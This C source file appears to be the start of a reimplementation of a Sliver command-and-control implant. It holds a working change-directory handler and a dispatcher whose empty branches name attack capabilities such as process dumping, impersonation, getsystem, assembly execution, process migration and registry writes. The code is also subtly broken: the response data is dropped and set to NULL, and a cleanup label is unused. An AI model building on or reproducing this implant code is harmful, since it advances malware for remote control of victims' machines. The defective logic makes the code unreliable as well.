#include "pch.h"

PENVELOPE CdHandler
(
	_In_ PENVELOPE pEnvelope
)
{
	PPBElement pElement = NULL;
	DWORD dwNumberOfBytesRead = 0;
	PBUFFER* pTemp = NULL;
	LPSTR lpRespData = NULL;
	PENVELOPE pRespEnvelope = NULL;

	pElement = ALLOC(sizeof(PBElement));
	pElement->Type = Bytes;
	pElement->dwFieldIdx = 1;

	pTemp = UnmarshalStruct(&pElement, 1, pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, &dwNumberOfBytesRead);
	if (!SetCurrentDirectoryA(pTemp[0]->pBuffer)) {
		lpRespData = ALLOC(0x100);
		sprintf_s(lpRespData, 0x100, "SetCurrentDirectoryA failed at %s. Error code: 0x%08x", __FUNCTION__, GetLastError());
	}
	else {
		lpRespData = ALLOC(MAX_PATH);
		GetCurrentDirectoryA(MAX_PATH, lpRespData);
	}

	FreeElement(pElement);
	pElement = CreateBytesElement(lpRespData, lstrlenA(lpRespData), 1);
	pRespEnvelope = ALLOC(sizeof(ENVELOPE));
	pRespEnvelope->uID = pEnvelope->uID;
	pRespEnvelope->pData = pRespEnvelope->pData;
	pRespEnvelope->pData = NULL;
	//UnmarshalSliverReq()

CLEANUP:
	if (pTemp != NULL) {
		FREE(*pTemp);
		FREE(pTemp);
	}

	FreeElement(pElement);
	return pRespEnvelope;
}

VOID MainHandler
(
	_In_ PENVELOPE_WRAPPER pWrapper
)
{
	PENVELOPE pResp = NULL;
	PENVELOPE pEnvelope = pWrapper->pEnvelope;

	if (pEnvelope->uType == MsgTaskReq) {
	
	}
	else if (pEnvelope->uType == MsgProcessDumpReq) {
	
	}
	else if (pEnvelope->uType == MsgImpersonateReq) {
	
	}
	else if (pEnvelope->uType == MsgRevToSelfReq) {
	
	}
	else if (pEnvelope->uType == MsgRunAsReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeGetSystemReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeInProcExecuteAssemblyReq) {
	
	}
	else if (pEnvelope->uType == MsgInvokeMigrateReq) {
	
	}
	else if (pEnvelope->uType == MsgSpawnDllReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgStopServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgRemoveServiceReq) {
	
	}
	else if (pEnvelope->uType == MsgEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgSetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgUnsetEnvReq) {
	
	}
	else if (pEnvelope->uType == MsgExecuteWindowsReq) {
	
	}
	else if (pEnvelope->uType == MsgGetPrivsReq) {
	
	}
	else if (pEnvelope->uType == MsgCurrentTokenOwnerReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadHiveReq) {
	
	}
	else if (pEnvelope->uType == MsgIfconfigReq) {
	
	}
	else if (pEnvelope->uType == MsgScreenshotReq) {
	
	}
	else if (pEnvelope->uType == MsgSideloadReq) {
	
	}
	else if (pEnvelope->uType == MsgNetstatReq) {
	
	}
	else if (pEnvelope->uType == MsgMakeTokenReq) {
	
	}
	else if (pEnvelope->uType == MsgPsReq) {
	
	}
	else if (pEnvelope->uType == MsgTerminateReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryReadReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryWriteReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryCreateKeyReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryDeleteKeyReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistrySubKeysListReq) {
	
	}
	else if (pEnvelope->uType == MsgRegistryListValuesReq) {
	
	}
	else if (pEnvelope->uType == MsgServicesReq) {
	
	}
	else if (pEnvelope->uType == MsgServiceDetailReq) {
	
	}
	else if (pEnvelope->uType == MsgStartServiceByNameReq) {
	
	}
	else if (pEnvelope->uType == MsgMountReq) {
	
	}
	else if (pEnvelope->uType == MsgPing) {
	
	}
	else if (pEnvelope->uType == MsgLsReq) {
	
	}
	else if (pEnvelope->uType == MsgDownloadReq) {
	
	}
	else if (pEnvelope->uType == MsgUploadReq) {
	
	}
	else if (pEnvelope->uType == MsgCdReq) {
		pResp = CdHandler(pEnvelope);
	}
	else if (pEnvelope->uType == MsgPwdReq) {
	
	}
	else if (pEnvelope->uType == MsgRmReq) {
	
	}
	else if (pEnvelope->uType == MsgMvReq) {
	
	}
	else if (pEnvelope->uType == MsgCpReq) {
	
	}
	else if (pEnvelope->uType == MsgMkdirReq) {
	
	}
	else if (pEnvelope->uType == MsgExecuteReq) {
	
	}
	else if (pEnvelope->uType == MsgReconfigureReq) {
	
	}
	else if (pEnvelope->uType == MsgSSHCommandReq) {
	
	}
	else if (pEnvelope->uType == MsgChtimesReq) {
	
	}
	else if (pEnvelope->uType == MsgGrepReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgCallExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListExtensionsReq) {
	
	}
	else if (pEnvelope->uType == MsgRegisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgDeregisterWasmExtensionReq) {
	
	}
	else if (pEnvelope->uType == MsgListWasmExtensionsReq) {

	}
	else {

	}

	WriteEnvelope(pWrapper->pSliverClient, pResp);
	FreeEnvelope(pResp);
}

